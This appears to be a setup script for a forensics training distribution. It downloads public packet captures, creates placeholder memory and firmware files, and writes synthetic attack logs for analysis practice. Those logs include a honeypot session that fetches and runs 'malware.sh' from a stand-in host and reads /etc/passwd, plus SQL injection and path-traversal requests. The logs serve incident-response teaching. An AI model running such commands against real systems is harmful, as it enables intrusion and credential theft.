#!/bin/bash
# download-samples.sh - Script to download sample datasets for Orion-X

set -e
LOGFILE="/var/log/orionx/download_samples.log"
SAMPLES_DIR="/opt/orionx/data/samples"

# Create log directory if it doesn't exist
sudo mkdir -p /var/log/orionx
sudo touch $LOGFILE
sudo chown -R "$(whoami)":"$(whoami)" /var/log/orionx

# Log function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOGFILE"
}

log "Starting sample data download for Orion-X Phoenix Edition v1.5.5"

# Function to download PCAP samples
download_pcaps() {
    log "Downloading PCAP samples..."
    mkdir -p "$SAMPLES_DIR/pcaps"
    
    # Create README
    cat > "$SAMPLES_DIR/pcaps/README.txt" << EOF
PCAP Files Collection - Orion-X Phoenix Edition v1.5.5
======================================================

This directory contains packet capture files from actual malware traffic scenarios,
sourced primarily from the well-known repository malware-traffic-analysis.net.

These PCAPs cover various network infection patterns including:
- Malicious HTTP downloads
- Command and control (C2) traffic
- Exploit kit activity
- Data exfiltration
- Lateral movement

FILES IN THIS DIRECTORY:
------------------------

1. 2023-01-example-traffic.pcap.zip
   Description: PCAP of an infection scenario simulation
   Password: "infected" (standard password)

IMPORTANT WARNING:
-----------------
These files may contain malicious code and should be handled with care.
Do not execute any binaries extracted from these PCAPs.
Always keep these files within the Orion-X environment or similar 
controlled analysis systems.

USAGE:
------
These PCAPs can be analyzed using:
- The included Wireshark or TShark tools
- The artifact-analyzer.py script (with --type network flag)
- Network Security Monitoring tools like Zeek/Bro
- Suricata IDS for alert generation

ATTRIBUTION:
------------
PCAP files are provided for educational purposes.

LICENSE:
--------
These files are shared for educational use only.
EOF
    
    # Download a safe, educational PCAP - we'll use a public dataset
    wget -q -O "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" "https://download.netresec.com/pcap/maccdc-2012/maccdc2012_00000.pcap" || {
        log "Failed to download PCAP sample from primary source. Trying alternative..."
        wget -q -O "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" "https://github.com/sbousseaden/PCAP-ATTACK/raw/master/Discovery/dns_local_lookup.pcap" || {
            log "Failed to download PCAP sample. Creating a sample PCAP locally..."
            # Create a minimal PCAP if download fails
            sudo tcpdump -w "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap" -c 100 -i any
        }
    }
    
    log "Created PCAP sample: $SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap"
    
    # Creating a ZIP version with password for practice
    zip -P infected "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap.zip" "$SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap"
    log "Created password-protected zip: $SAMPLES_DIR/pcaps/2023-01-example-traffic.pcap.zip (password: infected)"
}

# Function to create memory sample (not a real memory dump, just a placeholder)
create_memory_sample() {
    log "Creating memory sample placeholder..."
    mkdir -p "$SAMPLES_DIR/memory"
    
    # Create README
    cat > "$SAMPLES_DIR/memory/README.txt" << EOF
Memory Dumps Collection - Orion-X Phoenix Edition v1.5.5
========================================================

This directory would normally contain volatile memory images that can be used for 
forensic analysis training and testing. In this Docker test environment, we include
placeholder files instead of actual memory dumps due to size constraints.

In a full Orion-X installation, you would find memory dumps containing artifacts 
of malware or typical system usage.

USAGE:
------
In a real Orion-X environment, memory dumps can be analyzed using:

- Volatility (included in Orion-X)
  Example commands:
vol -f memory_sample.raw windows.pslist
vol -f memory_sample.raw windows.netscan

- The artifact-analyzer.py script
Example:
python3 /usr/bin/artifact-analyzer.py memory_sample.raw -t memory

SYSTEM REQUIREMENTS:
-------------------
Note that memory analysis is memory-intensive. It's recommended to have
at least 8GB of RAM when working with larger memory dumps.

ATTRIBUTION:
-----------
In a normal installation, memory images would be provided courtesy of:
- The Volatility Foundation (volatility samples)
- NIST CFReDS (cfreds.nist.gov)
- Various CTF competitions

LICENSE:
-------
Sample files would be shared for educational and training purposes only.
EOF
  
  # Create a small placeholder file
  dd if=/dev/urandom of="$SAMPLES_DIR/memory/mini_sample.raw" bs=1M count=5
  log "Created memory sample placeholder: $SAMPLES_DIR/memory/mini_sample.raw"
  
  # Create a ZIP version with password for practice
  zip -P orionx "$SAMPLES_DIR/memory/mini_sample.raw.zip" "$SAMPLES_DIR/memory/mini_sample.raw"
  log "Created password-protected zip: $SAMPLES_DIR/memory/mini_sample.raw.zip (password: orionx)"
}

# Function to create firmware sample
create_firmware_sample() {
  log "Creating firmware sample placeholder..."
  mkdir -p "$SAMPLES_DIR/firmware"
  
  # Create README
  cat > "$SAMPLES_DIR/firmware/README.txt" << EOF
Firmware Images Collection - Orion-X Phoenix Edition v1.5.5
==========================================================

This directory would normally contain firmware binary dumps from IoT devices for
reverse engineering and vulnerability analysis practice.

In this Docker test environment, we include placeholder files instead of actual 
firmware images due to size and licensing constraints.

USAGE:
-----
In a real Orion-X environment, these firmware images could be analyzed using:

- Binwalk (for initial analysis)
binwalk firmware_sample.bin

- Firmware-mod-kit (for extraction)
./extract-firmware.sh firmware_sample.bin

IMPORTANT NOTES:
--------------
1. Firmware images are provided for educational purposes only
2. Do not flash these images to actual hardware
3. Some images may contain intentional vulnerabilities for training

ATTRIBUTION:
-----------
In a normal installation, firmware would be provided with proper attribution
to the original sources.

LICENSE:
-------
Firmware images would be distributed under appropriate licenses,
with educational use restrictions.
EOF
  
  # Create a small placeholder file with some recognizable patterns
  dd if=/dev/urandom of="$SAMPLES_DIR/firmware/sample_firmware.bin" bs=1M count=2
  echo "OpenWrt" >> "$SAMPLES_DIR/firmware/sample_firmware.bin"
  echo "Linux version" >> "$SAMPLES_DIR/firmware/sample_firmware.bin"
  log "Created firmware sample placeholder: $SAMPLES_DIR/firmware/sample_firmware.bin"
}

# Function to create log samples
create_log_samples() {
  log "Creating log samples..."
  mkdir -p "$SAMPLES_DIR/logs/cowrie"
  mkdir -p "$SAMPLES_DIR/logs/web-attacks"
  
  # Create README
  cat > "$SAMPLES_DIR/logs/README.txt" << EOF
Log Files Collection - Orion-X Phoenix Edition v1.5.5
====================================================

This directory contains log files showing examples of attacks,
intrusions, and suspicious activities. These can be used for log analysis
training and incident response practice.

SUBDIRECTORIES:
-------------

1. cowrie/
 Description: Logs from Cowrie SSH/Telnet honeypot that records attacker interactions
 Contents: JSON and text logs showing attacker sessions, commands, and downloads
 
2. web-attacks/
 Description: Web server logs containing attack attempts
 Contents: Apache/Nginx access logs with SQL injection, path traversal, and scanning attempts

FILES IN THIS DIRECTORY:
----------------------

1. linux-ssh-intrusion.log
 Description: Linux system syslog showing an SSH intrusion and privilege escalation
 Size: Sample file for analysis practice

USAGE:
-----
These logs can be analyzed using:

- Standard Unix tools:
grep -i "failure" linux-ssh-intrusion.log

- The storyboard-gen.py script for timeline creation:
python3 /usr/bin/storyboard-gen.py -i /opt/orionx/data/samples/logs/ -o attack_timeline.html

- The artifact-analyzer.py script:
python3 /usr/bin/artifact-analyzer.py linux-ssh-intrusion.log -t log

ATTRIBUTION:
-----------
These logs are synthetically created for educational purposes.

LICENSE:
-------
These logs are provided for educational purposes only.
EOF
  
  # Create SSH intrusion log sample
  cat > "$SAMPLES_DIR/logs/linux-ssh-intrusion.log" << EOF
Jan 15 00:23:15 server sshd[12345]: Failed password for invalid user admin from 203.0.113.10 port 41297 ssh2
Jan 15 00:23:18 server sshd[12346]: Failed password for invalid user admin from 203.0.113.10 port 41298 ssh2
Jan 15 00:23:21 server sshd[12347]: Failed password for invalid user root from 203.0.113.10 port 41299 ssh2
Jan 15 00:23:24 server sshd[12348]: Failed password for invalid user root from 203.0.113.10 port 41300 ssh2
Jan 15 00:23:27 server sshd[12349]: Failed password for invalid user oracle from 203.0.113.10 port 41301 ssh2
Jan 15 00:23:30 server sshd[12350]: Accepted password for user from 203.0.113.10 port 41302 ssh2
Jan 15 00:23:30 server sshd[12350]: pam_unix(sshd:session): session opened for user user by (uid=0)
Jan 15 00:23:42 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
Jan 15 00:23:42 server sudo: pam_unix(sudo:session): session opened for user root by user(uid=0)
Jan 15 00:24:15 server useradd[12355]: new user: name=backdoor, UID=1010, GID=1010, home=/home/backdoor, shell=/bin/bash
Jan 15 00:24:30 server usermod[12356]: add 'backdoor' to group 'sudo'
Jan 15 00:24:45 server sshd[12357]: Accepted password for backdoor from 203.0.113.10 port 41310 ssh2
Jan 15 00:24:45 server sshd[12357]: pam_unix(sshd:session): session opened for user backdoor by (uid=0)
Jan 15 00:25:05 server sshd[12350]: pam_unix(sshd:session): session closed for user user
EOF
  log "Created SSH intrusion log sample"
  
  # Create Cowrie honeypot log samples
  cat > "$SAMPLES_DIR/logs/cowrie/cowrie.json" << EOF
{"eventid":"cowrie.login.success","timestamp":"2023-01-15T02:03:33.885191Z","src_ip":"198.51.100.22","username":"admin","password":"admin123","sensor":"honeypot-1"}
{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:35.125718Z","src_ip":"198.51.100.22","input":"uname -a","sensor":"honeypot-1"}
{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:38.223914Z","src_ip":"198.51.100.22","input":"cat /etc/passwd","sensor":"honeypot-1"}
{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:42.347021Z","src_ip":"198.51.100.22","input":"wget http://malicious.example.com/malware.sh","sensor":"honeypot-1"}
{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:45.488132Z","src_ip":"198.51.100.22","input":"chmod +x malware.sh","sensor":"honeypot-1"}
{"eventid":"cowrie.command.input","timestamp":"2023-01-15T02:03:48.512346Z","src_ip":"198.51.100.22","input":"./malware.sh","sensor":"honeypot-1"}
{"eventid":"cowrie.session.closed","timestamp":"2023-01-15T02:04:02.723145Z","src_ip":"198.51.100.22","duration":29.84,"sensor":"honeypot-1"}
EOF
  log "Created Cowrie honeypot log sample"
  
  # Create web attack log samples
  cat > "$SAMPLES_DIR/logs/web-attacks/access.log" << EOF
192.0.2.123 - - [15/Jan/2023:03:12:18 +0000] "GET /admin HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
192.0.2.123 - - [15/Jan/2023:03:12:20 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
192.0.2.123 - - [15/Jan/2023:03:12:25 +0000] "GET /manager/html HTTP/1.1" 404 198 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
192.0.2.45 - - [15/Jan/2023:03:45:10 +0000] "GET /login.php HTTP/1.1" 200 1532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:15 +0000] "POST /login.php HTTP/1.1" 200 1532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:18 +0000] "GET /admin.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:20 +0000] "GET /search.php?q=test HTTP/1.1" 200 2541 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:25 +0000] "GET /search.php?q=test'%20OR%20'1'='1 HTTP/1.1" 200 8721 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:30 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 403 1267 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.0.2.45 - - [15/Jan/2023:03:45:35 +0000] "GET /phpinfo.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
EOF
  log "Created web attack log sample"
}

# Download/create all samples
download_pcaps
create_memory_sample
create_firmware_sample
create_log_samples

# Set correct permissions
sudo chown -R "$(whoami)":"$(whoami)" "$SAMPLES_DIR"
sudo chmod -R 755 "$SAMPLES_DIR"

log "Sample data download/creation completed"
echo "Sample data has been downloaded and organized in $SAMPLES_DIR"
echo "You can now use these samples with the Orion-X analysis tools."